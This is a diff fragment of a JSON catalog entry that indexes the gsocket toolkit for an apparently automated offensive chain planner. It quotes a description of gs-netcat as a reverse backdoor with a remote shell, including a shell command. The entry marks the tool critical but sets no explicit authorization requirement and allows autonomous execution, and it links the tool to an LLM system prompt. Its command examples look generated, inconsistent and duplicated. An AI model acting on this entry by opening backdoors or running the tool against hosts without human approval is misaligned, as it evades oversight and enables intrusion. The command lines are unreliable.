+        "file_type": "Bourne-Again shell script, ASCII text executable, with very long lines (384)"
+      }
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "source": {
+    "official": true,
+    "page": "https://www.kali.org/tools/gsocket/",
+    "raw_markdown": "https://gitlab.com/kalilinux/documentation/kali-tools/-/raw/main/gsocket/index.md",
+    "retrieved_at": "2026-07-14T13:05:50+00:00",
+    "sha256": "2dc4c0c07662e3a32bf87d5d20f01502a36b274a38ffd25d60184edd7afbb5dd"
+  },
+  "apt_metadata": {
+    "section": "net",
+    "installed_size": "278",
+    "maintainer": "Daniel Echeverri <epsilon@debian.org>",
+    "architecture": "amd64",
+    "version": "1.4.43-4",
+    "depends": "libc6 (>= 2.34), libssl3t64 (>= 3.0.0), dpkg-dev",
+    "description": "Allows two machines on different networks to communicate with each other\nAbandon the thought of IP Addresses and Port Numbers. Instead start thinking\nthat two programs should be able to communicate with each other as long as\nthey know the same secret (rather than each other's IP Address and Port\nNumber). The Global Socket library facilitates this: It locally derives\ntemporary session keys and IDs and connects two programs through the Global\nSocket Relay Network (GSRN) regardless and independent of the local IP\nAddress or geographical location.\n.\nOnce connected the library then negotiates a secure TLS connection(End-2-End).\nThe secret never leaves your workstation. The GSRN sees only the encrypted\ntraffic.\n.\nThe GSRN is a free cloud service and is free to use by anyone.\n.\nThe Global Socket Toolkit comes with a set of tools:\n.\ngsocket - Makes an existing program (behind firewall or NAT) accessible from\nanywhere in the world. It does so by analyzing the program and replacing the\nIP-Layer with its own Gsocket-Layer. A client connection to a hostname ending\nin '*.gsocket' then gets automatically redirected (via the GSRN) to this\nprogram.\n.\ngs-netcat - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted\nreverse backdoor via TOR (optional) with a true PTY/interactive command shell\n(gs-netcat -s MySecret -i), integrated file-transfer, spawn a Socks4/4a/5\nproxy or forward TCP connections or give somebody temporary shell access.\n.\ngs-sftp - sftp server & client between two firewalled workstations.\ngs-mount - Access and mount a remote file system.\nblitz - Copy data from workstation to workstation.",
+    "homepage": "https://github.com/hackerschoice/gsocket"
+  },
+  "tags": [
+    "offensive",
+    "gsocket",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/gsocket && python3 gsocket.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/gsocket && python3 gsocket.py --help",
+    "cd toolboxes/gsocket && python3 gsocket.py --help",
+    "cd toolboxes/gsocket && python3 gsocket.py --help",
+    "cd toolboxes/gsocket && python3 gsocket.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST gsocket --output $KFIOSA_OUTPUT_DIR/gsocket.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST gsocket --output $KFIOSA_OUTPUT_DIR/gsocket.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
